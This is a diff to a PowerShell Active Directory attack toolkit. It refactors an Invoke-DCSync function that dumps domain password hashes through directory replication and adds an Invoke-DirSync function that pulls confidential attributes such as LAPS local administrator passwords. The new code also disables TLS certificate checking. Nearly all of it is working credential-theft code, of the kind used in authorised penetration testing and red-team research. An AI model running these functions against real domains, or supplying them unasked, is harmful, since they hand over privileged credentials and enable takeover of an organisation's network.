@@ -9,7 +9,8 @@ Function Invoke-DCSync {
 
 .DESCRIPTION
     Invoke-DCSync extracts domain accounts from Active Directory via DCSync attack, including password hashes.
-    By default, all account objects are returned
+    It requires DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights to replicate secret attributes.
+    By default, all account objects are returned.
 
 .NOTES
     DSInternals powershell module must be installed first:
@@ -59,48 +60,145 @@ Function Invoke-DCSync {
     }
 
     # Retrieve base DN
-    $BaseURI = "LDAP://" + $Server
-    $SearchString = $BaseURI + "/RootDSE"
-    if ($Credential.UserName) {
-        $DomainObject = New-Object System.DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
-    }
-    else {
-        $DomainObject = New-Object System.DirectoryServices.DirectoryEntry($SearchString)
-    }
-    $BaseDN = $DomainObject.defaultNamingContext
+    $rootDSE = Get-LdapRootDSE -Server $Server
+    $defaultNC = $rootDSE.defaultNamingContext[0]
 
     if ($SamAccountName) {
         # Retrieve NetBIOS name 
-        $SearchString = $BaseURI + "/" + "cn=Partitions," + $DomainObject.configurationNamingContext
-        if ($Credential.UserName) {
-            $DomainObject = New-Object System.DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
-            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
-        }
-        else {
-            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
-        }
-        $Searcher.Filter = "(&(objectCategory=crossRef)(ncName=" + $BaseDN + "))"
-        $Searcher.SearchScope = "OneLevel";
-        $null = $Searcher.PropertiesToLoad.Add("nETBIOSName")
-        $Results = $Searcher.FindAll()
-        $NetbiosName = $Results[0].Properties["nETBIOSName"]
-        $Results.dispose()
-        $Searcher.dispose()
+        $netbiosName = (Get-LdapObject -Server $Server -SSL:$SSL -SearchBase $defaultNC -SearchScope 'Base' -Filter '(objectClass=domain)' -Properties 'name' -Credential $Credential).name
         # Dump a specific domain account
         if ($Credential.UserName) {
-            Get-ADReplAccount -SamAccountName "$SamAccountName" -Server "$Server" -Domain $NetbiosName -Credential $Credential
+            Get-ADReplAccount -SamAccountName "$SamAccountName" -Server "$Server" -Domain $netbiosName -Credential $Credential
         }
         else {
-            Get-ADReplAccount -SamAccountName "$SamAccountName" -Server "$Server" -Domain $NetbiosName
+            Get-ADReplAccount -SamAccountName "$SamAccountName" -Server "$Server" -Domain $netbiosName
         }
     }
     else {
         # Dump all domain accounts
         if ($Credential.UserName) {
-            Get-ADReplAccount -All -NamingContext "$BaseDN" -Server "$Server" -Credential $Credential
+            Get-ADReplAccount -All -NamingContext "$defaultNC" -Server "$Server" -Credential $Credential
         }
         else {
-            Get-ADReplAccount -All -NamingContext "$BaseDN" -Server "$Server"
+            Get-ADReplAccount -All -NamingContext "$defaultNC" -Server "$Server"
+        }
+    }
+}
+
+Function Invoke-DirSync {
+<#
+.SYNOPSIS
+    Retrieve the value of confidential and RODC filtered attributes through a directory synchronization.
+
+.DESCRIPTION
+    Invoke-DirSync uses the LDAP_SERVER_DIRSYNC_OID control to synchronize any attribute(s), such as LAPS' ms-Mcs-AdmPwd.
+    It requires DS-Replication-Get-Changes-In-Filtered-Set and/or DS-Replication-Get-Changes extended rights, depending on the requested attribute.
+    It is highly inspired from @simondotsh's DirSync tool.
+
+.PARAMETER Server
+    Specifies the LDAP server to query.
+
+.PARAMETER SSL
+    Use SSL connection to LDAP server.
+
+.PARAMETER SearchBase
+    Specifies the base distinguished name to search through.
+
+.PARAMETER SearchScope
+    Specifies the scope to search under, defaults to 'Subtree'.
+
+.PARAMETER Filter
+    Specifies an LDAP query string that is used to filter Active Directory objects, defaults to '(objectClass=computer)'.
+
+.PARAMETER Properties
+    Specifies the properties of the object to retrieve, defaults to 'ms-Mcs-AdmPwd' (LAPS).
+
+.PARAMETER PageSize
+    Specifies the maximum number of result to return, defaults to 200.
+
+.PARAMETER Credential
+    Specifies the domain account to use.
+
+.EXAMPLE
+    PS C:\> Invoke-DirSync -Server DC.ADATUM.CORP -Credential ADATUM\Administrator -SearchBase 'dc=adatum,dc=corp' -Filter "(objectClass=user)" -Properties unixUserPassword
+#>
+    [CmdletBinding()]
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Server = $($env:LOGONSERVER -replace '\\'),
+
+        [Switch]
+        $SSL,
+
+        [Parameter(Mandatory=$true)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $SearchBase,
+
+        [ValidateSet('Base', 'OneLevel', 'Subtree')]
+        [String]
+        $SearchScope = 'Subtree',
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Filter = '(objectClass=computer)',
+
+        [ValidateNotNullOrEmpty()]
+        [String[]]
+        $Properties = 'ms-Mcs-AdmPwd',
+
+        [ValidateRange(1,10000)] 
+        [Int]
+        $PageSize = 200,
+
+        [ValidateNotNullOrEmpty()]
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty
+    )
+
+    $results = @()
+    $rootDSE = Get-LdapRootDSE -Server $Server
+    $defaultNC = $rootDSE.defaultNamingContext[0]
+    $domain = $defaultNC -replace 'DC=' -replace ',','.'
+    [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
+    if ($SSL) {
+        $Server += ":636"
+    }
+    $searcher = New-Object -TypeName System.DirectoryServices.Protocols.LdapConnection -ArgumentList $Server
+    if ($SSL) {   
+        $searcher.SessionOptions.SecureSocketLayer = $true
+        $searcher.SessionOptions.VerifyServerCertificate = {$true}
+    }
+    $searcher.SessionOptions.DomainName = $domain
+    $searcher.AuthType = [DirectoryServices.Protocols.AuthType]::Negotiate
+    if ($Credential.UserName) {
+        $searcher.Bind($Credential)
+    }
+    else {
+        $searcher.Bind()
+    }
+ 
+    $request = New-Object -TypeName System.DirectoryServices.Protocols.SearchRequest($SearchBase, $Filter, $SearchScope, $Properties)
+    $pageRequestControl = New-Object -TypeName System.DirectoryServices.Protocols.PageResultRequestControl -ArgumentList $PageSize
+    $request.Controls.Add($pageRequestControl) | Out-Null
+    $dirSyncRequestControl = New-Object System.DirectoryServices.Protocols.DirSyncRequestControl
+    $request.Controls.Add($dirSyncRequestControl) | Out-Null
+    $response = $searcher.SendRequest($request)
+
+    foreach ($entry in $response.Entries) {
+        $obj = [ordered] @{}
+        $obj['DistinguishedName'] = $entry.distinguishedName
+        foreach ($attribute in $Properties) {
+            for ($i = 0; $i -lt $entry.Attributes[$attribute].Count; $i++) {
+                $value = $entry.Attributes[$attribute][$i]
+                $obj[$attribute] = $value
+            }
+        }
+        $obj = [pscustomobject] $obj
+        if (($obj | Get-Member -MemberType Properties).Count -gt 1) {
+            Write-Output $obj
         }
     }
 }
@@ -175,10 +273,8 @@ Function Get-DpapiBackupKey {
             # Use MS-DRSR protocol aka directory replication
             try {
                 # Retrieve the DNS name of the target Active Directory domain
-                $searchString = "LDAP://$Server/RootDSE"
-                $rootDSE = New-Object DirectoryServices.DirectoryEntry($searchString, $null, $null)
+                $rootDSE = Get-LdapRootDSE -Server $Server
                 $defaultNC = $rootDSE.defaultNamingContext[0]
-                $adsPath = "LDAP://$Server/$defaultNC"
                 $domain = $defaultNC -replace 'DC=' -replace ',','.'
             }
             catch {
@@ -727,7 +823,7 @@ Function Local:Get-LdapObject {
         [String]
         $SearchBase,
 
-        [ValidateNotNullOrEmpty()]
+        [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
         $SearchScope = 'Subtree',
 
@@ -767,12 +863,9 @@ Function Local:Get-LdapObject {
             else {
                 $searcher.Bind()
             }
-            $request = New-Object -TypeName System.DirectoryServices.Protocols.SearchRequest
-            $request.DistinguishedName = $SearchBase
-            $request.Scope = $SearchScope
+            $request = New-Object -TypeName System.DirectoryServices.Protocols.SearchRequest($SearchBase, $Filter, $SearchScope, $Properties)
             $pageRequestControl = New-Object -TypeName System.DirectoryServices.Protocols.PageResultRequestControl -ArgumentList $PageSize
             $request.Controls.Add($pageRequestControl) | Out-Null
-            $request.Filter = $Filter
             $response = $searcher.SendRequest($request)
             while ($true) {
                 $response = $searcher.SendRequest($request)
@@ -786,8 +879,7 @@ Function Local:Get-LdapObject {
                     break
                 }
                 $pageRequestControl.Cookie = $pageResponseControl.Cookie
-            }
-            
+            }            
         }
         else {
             $adsPath = "LDAP://$Server/$SearchBase"
